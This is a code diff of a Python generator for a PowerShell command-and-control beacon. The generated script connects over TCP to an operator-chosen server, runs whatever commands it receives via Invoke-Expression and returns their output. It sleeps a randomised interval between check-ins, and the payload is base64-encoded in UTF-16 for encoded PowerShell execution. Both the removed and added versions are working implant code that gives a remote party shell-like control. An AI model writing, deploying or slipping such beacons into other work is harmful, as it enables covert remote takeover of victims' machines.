@@ -7,68 +7,59 @@ def win(ip, port, delay, jitter):
     $Delay = {delay}
     $Jitter = {jitter}
     """
-    code = """
-    # Function to generate random sleep interval
-    function Get-RandomSleepTime {
-        param (
-            [int]$BaseDelay,
-            [int]$Jitter
-        )
-        $lower = $BaseDelay - $Jitter
-        $upper = $BaseDelay + $Jitter
-        return Get-Random -Minimum $lower -Maximum ($upper + 1)
-    }
+    code = """function Get-RandomSleepTime {
+    param (
+        [int]$BaseDelay,
+        [int]$Jitter
+    )
+    $Lower = $BaseDelay - $Jitter
+    $Upper = $BaseDelay + $Jitter
+    return (Get-Random -Minimum $Lower -Maximum ($Upper + 1))
+}
 
-    # Infinite loop to beacon to the agent server
-    while ($true) {
-        try {
-            # Establish TCP connection
-            $tcpClient = New-Object System.Net.Sockets.TcpClient
-            $tcpClient.Connect($ServerIP, $ServerPort)
-            $stream = $tcpClient.GetStream()
-            $reader = New-Object System.IO.StreamReader($stream)
-            $writer = New-Object System.IO.StreamWriter($stream)
-            $writer.AutoFlush = $true
+# Beacon to communicate with Agent Server
+while ($true) {
+    try {
+        Write-Host "[$(Get-Date)] Checking in..."
 
-            Write-Host "[$(Get-Date)] Checking in..."
+        # Open TCP socket
+        $Client = New-Object System.Net.Sockets.TcpClient
+        $Client.Connect($ServerIP, $ServerPort)
+        $Stream = $Client.GetStream()
+        $Reader = New-Object System.IO.StreamReader($Stream)
+        $Writer = New-Object System.IO.StreamWriter($Stream)
+        $Writer.AutoFlush = $true
 
-            # Inner loop to read and execute commands from the server
-            while ($tcpClient.Connected -and $stream.DataAvailable) {
-                # Read command from the server if available
-                $command = $reader.ReadLine()
-                if ($command) {
-                    Write-Host "Received command: $command"
-                    
-                    # Execute the command and capture output
-                    try {
-                        $output = Invoke-Expression $command 2>&1 | Out-String
-                    } catch {
-                        $output = "Error executing command: $_"
-                    }
-                    
-                    # Ensure output is in string format, handling arrays properly
-                    $formattedOutput = ($output -join "`n").Trim()
-                    
-                    # Send output back to server
-                    $writer.WriteLine($formattedOutput)
-                    $writer.WriteLine("ac2delim")
-                }
+        while ($Stream.DataAvailable -or !$Reader.EndOfStream) {
+            # Read command from server
+            $Command = $Reader.ReadLine()
+            Write-Host "Received command: $Command"
+
+            # Execute command and capture output
+            try {
+                $Output = Invoke-Expression $Command 2>&1 | Out-String
+                $Writer.WriteLine($Output)
+            } catch {
+                $Writer.WriteLine("Error: $($_.Exception.Message)")
             }
 
-            # Close connection after processing commands
-            $reader.Close()
-            $writer.Close()
-            $tcpClient.Close()
-            $stream = $null
-        }
-        catch {
-            Write-Host "Failed to connect or connection lost. Retrying after delay..."
+            # Send delimiter
+            $Writer.WriteLine("ac2delim")
         }
 
-        # Calculate randomized sleep time and wait before next connection attempt
-        $sleepTime = Get-RandomSleepTime -BaseDelay $Delay -Jitter $Jitter
-        Start-Sleep -Seconds $sleepTime
+        # Close connection
+        $Reader.Close()
+        $Writer.Close()
+        $Stream.Close()
+        $Client.Close()
+    } catch {
+        Write-Host "Error: $($_.Exception.Message)"
     }
+
+    # Sleep
+    $SleepTime = Get-RandomSleepTime -BaseDelay $Delay -Jitter $Jitter
+    Start-Sleep -Seconds $SleepTime
+}
     """
     payload = parameters + code
     b64 = base64.b64encode(payload.encode("utf-16")[2:]).decode("utf-8")
